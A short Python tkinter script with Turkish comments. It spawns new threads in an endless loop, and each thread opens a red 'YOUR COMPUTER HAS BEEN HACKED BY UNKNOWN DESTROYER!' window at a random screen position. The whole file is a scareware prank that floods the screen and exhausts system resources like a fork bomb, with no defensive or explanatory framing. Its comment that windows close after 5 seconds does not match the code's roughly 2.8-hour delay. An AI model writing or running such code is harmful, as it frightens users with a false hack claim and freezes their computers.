import tkinter as tk
import random
import threading

# Seçtiğin hata mesajı
hata_mesaji = "YOUR COMPUTER HAS BEEN HACKED BY UNKNOWN DESTROYER!"

# Ekranın rastgele yerlerinde pencere açan fonksiyon
def pencere_olustur():
    pencere = tk.Tk()
    
    # Pencerenin başlığı "HACKED" olarak ayarlandı
    pencere.title("HACKED")
    
    # Pencere genişliği biraz daha artırıldı, yüksekliği küçültüldü (600x100)
    pencere.geometry(f"600x100+{random.randint(0, pencere.winfo_screenwidth() - 600)}+{random.randint(0, pencere.winfo_screenheight() - 100)}")
    
    # Mesaj yazısının boyutunu ve rengini ayarladık
    label = tk.Label(pencere, text=hata_mesaji, fg="red", font=("Arial", 14, "bold"))
    label.pack(expand=True)
    
    # Pencereyi 5 saniye sonra kapatır
    pencere.after(9999000, pencere.destroy)
    
    pencere.mainloop()

# Sürekli ve beklemeden pencere açan fonksiyon
def baslat():
    while True:
        threading.Thread(target=pencere_olustur).start()

# Uygulamayı başlat
baslat()
